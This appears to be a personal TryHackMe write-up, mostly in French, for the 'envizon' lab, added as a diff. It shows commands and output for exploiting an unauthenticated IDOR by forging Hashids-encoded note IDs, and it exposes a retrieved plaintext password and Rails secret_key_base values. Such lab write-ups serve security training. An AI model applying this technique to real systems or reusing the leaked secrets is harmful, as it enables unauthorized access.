@@ -1,0 +1,114 @@
+================ ENVIZON - TRY HACK  ME NOTES ============
+
+Difficulé : HARD
+Instruction : You are facing an instance of the open source software "envizon" (https://github.com/evait-security/envizon) which is used by pentesters to visualize networks, find promising targets and a lot of other juicy stuff. It was developed by pentesters and should be almost unbreakable, right? The version 4.0.2alpha used here is still in permanent development and has not been tested for vulnerabilities yet. Your task is to find, exploit and chain vulnerabilities in a white-box approach in order to completely compromise the whole system.
+
+You can find the source code for the current version here: https://gitlab.com/evait-security/envizon_thm
+
+Three hints to start:
+
+    This is not an empty instance. Imagine that it is/was used and therefore contains user data
+    Currently a note function is under development
+    When looking for code execution on the system, the most obvious way is the best - it is important to understand what the application does
+
+
+Selenium container and with it the screenshot function has been disabled because of the high ram usage.
+
+
+1 - RECONNAISSANCE 
+
+Selon le scan.txt, deux ports sont ouvert : 22 ssh et 3000 ppp 
+kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/envizon$ curl -k -i https://$TARGET:3000/scans
+HTTP/1.1 302 Found
+Location: https://10.80.186.209:3000/users/sign_in
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-cache
+Set-Cookie: _envizon_session=WWpXZlVsSmxQd1N3VVpWbGs0Zmw5VFQ5ejZMd2hzWVZiWlUzWjN3aHduRUhZSjg4UmE4MU55REFwZk1lamxPa2RXaUpYak5IZUJtSWxMa3E4RFJEYSthVHY5UWZlaVhyTGE1Z1VwQ2VZVWRPVmxteFcvNkVwYlh6OTZGMmYvVy9IdkNOVWZzbmNTQmpQVzAxOEdMYkpmY3FvZ0hmSHNBRndLd0NDR2hYUW84ZExYclpvS0VmUXNDT3VtT2RiZFR3WlkwRUM1SlVwcjRnOTJzQldVemh0R2RNM2Q0NjRwYzFURmU4Ui9QUG5oYz0tLXJ2alFZOG5KendaMFc2OURRcGZyYlE9PQ%3D%3D--4ec55d5b3b1f681d3268442d77122a99c9fcd094; path=/; secure; HttpOnly
+X-Request-Id: 04fa9658-9366-4805-83d5-bf33a370e8a9
+X-Runtime: 0.057479
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Transfer-Encoding: chunked
+
+<html><body>You are being <a href="https://10.80.186.209:3000/users/sign_in">redirected</a>.</body></html>(venv) kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/envizon$ 
+
+On telecharge donc le code, on lit les controllers, les models et les routes, on sait immediatement qu´il y a un IDOR sur une route aui n´a pas besoin d´authentification
+
+
+https://10.80.177.160:3000/notes/1 avec le message Text: Hi Paul, for security reasons I added hashids with a length of 30 characters to notes. I stored the password for this envizon instance in the note with id 380 and sent you the link by email. We may should consider to add more security layers to this gem (https://github.com/dtaniwaki/acts_as_hashids) 
+
+Cela suppose d´utiliser hashid de ruby (documentation : https://github.com/dtaniwaki/acts_as_hashids)
+
+on va donc faire :
+kryptonite@kryptonite-X550CC:~/Bureau/homelab/envizon_thm$ sudo gem install hashids
+[sudo] Mot de passe de kryptonite :          
+Fetching hashids-1.0.6.gem
+Successfully installed hashids-1.0.6
+Parsing documentation for hashids-1.0.6
+Installing ri documentation for hashids-1.0.6
+Done installing documentation for hashids after 1 seconds
+1 gem installed
+kryptonite@kryptonite-X550CC:~/Bureau/homelab/envizon_thm$ irb
+irb(main):001:0> require "hashids"
+=> true
+irb(main):002:0> Hashids.new("Notes", 30)
+=> #<Hashids:0x00007230ca58a148 @alphabet="32rM9BaOW0Vneb586mYo4lN7AZkgGREPpvDyJdj1LzKw", @guards="xqXQ", @min_hash_length=30, @salt="Notes", @seps="uICsFHhiSTUtfc">
+irb(main):003:0> Hashids.new("Note", 30)
+=> #<Hashids:0x00007230ca0a5790 @alphabet="ADoq82QgdPlZmb10N95xB6O3kyjraJG47vpRYnXeLzKw", @guards="VEMW", @min_hash_length=30, @salt="Note", @seps="uSIhTCHFisUtfc">
+irb(main):004:0> Hashids.new('Note', 30)
+=> #<Hashids:0x00007230ca4a3220 @alphabet="ADoq82QgdPlZmb10N95xB6O3kyjraJG47vpRYnXeLzKw", @guards="VEMW", @min_hash_length=30, @salt="Note", @seps="uSIhTCHFisUtfc">
+irb(main):005:0> hid.encode(380)
+(irb):5:in `<main>': undefined local variable or method `hid' for main:Object (NameError)
+        from /usr/lib/ruby/gems/3.2.0/gems/irb-1.6.2/exe/irb:11:in `<top (required)>'
+        from /usr/bin/irb:25:in `load'                                   
+        from /usr/bin/irb:25:in `<main>'                                 
+irb(main):006:0> hid.encode(380)
+(irb):6:in `<main>': undefined local variable or method `hid' for main:Object (NameError)
+        from /usr/lib/ruby/gems/3.2.0/gems/irb-1.6.2/exe/irb:11:in `<top (required)>'
+        from /usr/bin/irb:25:in `load'                                   
+        from /usr/bin/irb:25:in `<main>'                                 
+irb(main):007:0> hid = Hashids.new("Note", 30)
+=> #<Hashids:0x00007230ca376690 @alphabet="ADoq82QgdPlZmb10N95xB6O3kyjraJG47vpRYnXeLzKw", @guards="VEMW", @min_hash_length=30, @salt="Note", @seps="uSIhTCHFisUtfc">
+irb(main):008:0> hid.encode(380)
+=> "y2a419eKDBLRvEYobWNpw0jnr6xlAX"
+irb(main):009:0> 
+On a notre url encodé 
+
+https://10.80.177.160:3000/notes/y2a419eKDBLRvEYobWNpw0jnr6xlAX et notre notes : Text: Password for envizon: rE8Z*qyM!DTKNP8fGu4T3CtW*aurBQwLF 
+
+cat config/secrets.yml
+# Be sure to restart your server when you modify this file.
+
+# Your secret key is used for verifying the integrity of signed cookies.
+# If you change this key, all old signed cookies will become invalid!
+
+# Make sure the secret is at least 30 characters and all random,
+# no regular words or you'll be exposed to dictionary attacks.
+# You can use `rails secret` to generate a secure secret key.
+
+# Make sure the secrets in this file are kept private
+# if you're sharing your code publicly.
+
+# Shared secrets are available across all environments.
+
+# shared:
+#   api_key: a1B2c3D4e5F6
+
+# Environmental secrets are only available for that specific environment.
+
+development:
+  secret_key_base: 6b2d9f9e757405c6f899c4031c412e7c9e4ac156cefab5d0f05b3c68cc2e996a4f3c5fc31cf500fd14761be2b01882c8a07cc7a3e641432cdc423e82e64c86fa
+
+test:
+  secret_key_base: 5849dae01ce1a5d8047dfbe3113582a872e64be4ded28aee5f292931c3aa4e97af8902140a0deff2543195d9ab344e57db24e13745135b8c38473cd2c89b52d4
+
+# Do not keep production secrets in the unencrypted secrets file.
+# Instead, either read values from the environment.
+# Or, use `bin/rails secrets:setup` to configure encrypted secrets
+# and move the `production:` environment over there.
+
+production:
+  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
+
+
+
+
